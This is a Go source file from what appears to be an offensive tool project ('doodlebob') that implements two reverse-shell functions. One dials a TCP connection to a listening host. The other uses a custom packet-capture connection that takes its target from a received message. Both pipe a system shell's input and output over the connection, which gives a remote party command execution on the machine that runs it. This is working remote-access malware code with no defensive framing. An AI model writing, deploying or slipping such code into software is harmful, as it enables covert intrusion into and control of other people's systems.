// Contains logic for a reverse shell
package executor

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/doodlebob/pkg/pcapconn"
)

// OpenReverseShell opens an OS agnostic reverse shell to a listening host
func OpenReverseShell(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Pipe stdin, stdout, and stderr to the connection and execute a shell
	cmd := exec.Command(getShell())
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Run the command
	cmd.Run()

	return nil
}

// OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
func OpenPcapReverseShell(msg *message.Message) error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	conn, err := pcapconn.Dial(
		dialCtx, device, sourcePort, targetIP, targetPort,
	)
	cancel()
	if err != nil {
		return err
	}
	defer conn.Close()

	// Dial's context only controls connection establishment.
	// Close the connection to interrupt a blocked Read on shutdown.
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	// Pipe stdin, stdout, and stderr to the connection and execute a shell
	cmd := exec.Command(getShell())
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Run the command
	cmd.Run()

	return nil
}
